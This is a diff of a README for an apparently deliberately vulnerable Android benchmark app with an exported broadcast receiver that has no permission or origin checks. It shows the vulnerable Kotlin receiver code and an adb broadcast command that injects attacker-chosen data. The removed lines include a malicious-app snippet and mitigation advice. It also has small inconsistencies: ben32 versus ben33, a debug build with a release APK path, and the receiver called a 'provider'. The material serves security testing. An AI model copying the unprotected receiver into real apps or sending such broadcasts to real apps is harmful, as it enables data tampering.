@@ -1,8 +1,8 @@
 # oxo-android-ben32 Critical broadcast receiver is not protected
 
-This Android application benchmark, oxo-android-ben33, demonstrates a common security vulnerability where a broadcast receiver is exported without proper protection. This allows any other application on the device to send a broadcast intent to it, potentially leading to unauthorized data manipulation or a denial-of-service.
+### Description
 
-### Technical Details
+This Android application benchmark, oxo-android-ben33, demonstrates a common security vulnerability where a broadcast receiver is exported without proper protection. This allows any other application on the device to send a broadcast intent to it, potentially leading to unauthorized data manipulation or a denial-of-service.
 
 The vulnerability lies in the `Receiver.kt` file and the AndroidManifest.xml.
 
@@ -26,7 +26,6 @@ The vulnerability lies in the `Receiver.kt` file and the AndroidManifest.xml.
 
 
 ```
-
 // No origin checks, no permission checks, trusts all extras blindly
 val msg = intent.getStringExtra("message") ?: "(no message)"
 val amount = intent.getIntExtra("amount", 0)
@@ -39,50 +38,33 @@ prefs.edit()
     .apply()
 ```
 
-### Exploitation
+### Vulnerability Type and Category
+-   **Type:** Critical broadcast receiver is not protected
+-   **Category:** Improper Access Control / Component Exposure
 
-A malicious app can exploit this vulnerability with a simple Broadcast intent. By knowing the vulnerable app's package name and the broadcast action, an attacker can send an intent with arbitrary data.
+### Difficulty
+Easy
 
+## Build and Test Instructions
 
-Example Attack via `adb shell`
-
-You can exploit this vulnerability from a computer connected to the device via ADB (Android Debug Bridge) using the am broadcast command.
-
-
+### Build
+This project uses Android Studio with Kotlin. To build the debug APK from the terminal:
+```bash
+# Navigate into the source code directory first
+cd src/
+./gradlew build
 ```
-adb shell am broadcast \
-    -a com.example.vulnerablereceiverapp.TRIGGER \
-    -n com.example.vulnerablereceiverapp/.Receiver \
-    --es message "Pwned from ADB" \
-    --ei amount 1337
-```
+The APK will be located at app/build/outputs/apk/release/app-release-unsigned.apk.
 
-This command will send a broadcast intent to the vulnerable receiver, which will then display a toast message on the device's screen.
+### How to Test
 
-#### Example Attack Code (from another app)
+1. Install the application on an Android device or emulator.
 
-A malicious app can also trigger this vulnerability programmatically:
-
-```angular2html
-val intent = Intent("com.example.vulnerablereceiverapp.TRIGGER")
-intent.setPackage("com.example.vulnerablereceiverapp") // Target the vulnerable app
-intent.putExtra("message", "!! I am an attacker !!")
-intent.putExtra("amount", 1337)
-
-context.sendBroadcast(intent)
-```
-
-This code, when executed by an external app, will trigger the Receiver in the vulnerable application, writing "!! I am an attacker !!" to its shared preferences and displaying a toast message to the user.
-
-
-### Mitigations
-
-To prevent this vulnerability, developers should:
-
-- Restrict access with permissions: Define and require a custom permission for the broadcast receiver, and ensure only trusted components (or the app itself) have this permission.
-
-- Set exported="false": If the broadcast receiver is only for internal use within the app, explicitly set android:exported="false" in the manifest.
-
-- Validate the sender: In the onReceive() method, check the sender's identity using Context.checkCallingOrSelfPermission() or other secure validation methods.
-
-By applying these mitigations, the broadcast receiver can be protected from unauthorized external access.
+2. Run the provider from adb:
+    ```bash
+    adb shell am broadcast \
+        -a com.example.vulnerablereceiverapp.TRIGGER \
+        -n com.example.vulnerablereceiverapp/.Receiver \
+        --es message "Pwned from ADB" \
+        --ei amount 1337
+   ```
